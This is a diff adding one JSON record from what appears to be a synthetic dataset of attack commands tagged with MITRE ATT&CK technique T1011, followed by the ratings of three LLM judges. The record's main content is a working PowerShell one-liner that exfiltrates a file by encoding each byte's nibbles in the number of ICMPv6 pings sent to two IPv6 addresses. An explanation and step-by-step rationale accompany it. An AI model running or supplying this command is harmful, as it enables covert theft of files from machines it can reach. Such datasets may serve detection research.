@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Encodes nibbles into the number of ICMPv6 echos (-Count) sent to two destinations, a covert channel over ICMPv6 under T1011.",
+  "rationale_steps": [
+    "Derive high/low nibbles from each byte.",
+    "Transmit small bursts where the burst length encodes the nibble.",
+    "Space bursts with a short sleep to delineate values for the receiver."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-a32fe73c",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced braces, valid operators (-shr, -band), correct Test-Connection parameters for Windows PowerShell, and proper statement separators.",
+        "semantic_score": 3,
+        "semantic_justification": "The command plausibly encodes file nibbles into ICMPv6 echo counts to two destinations as a covert channel, but this aligns with exfiltration over an alternate protocol rather than T1011\u2019s \u2018other network medium\u2019 (e.g., cellular/Bluetooth/Wi\u2011Fi).",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:55:03.227899Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, and valid cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by exfiltrating binary data through a covert channel using ICMPv6 echo requests where the data is encoded in the count of packets sent to two different IPv6 addresses.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:55:08.311886Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses perfectly well-formed PowerShell syntax, including correct variable assignments, cmdlet calls, loop constructs, bitwise operators, and parameter formatting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by encoding data nibbles into the ICMPv6 echo count for exfiltration, which is a plausible covert channel under the broad definition of T1011's 'Exfiltration Over Other Network Medium' as an alternative protocol/channel.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:20:11.360785Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
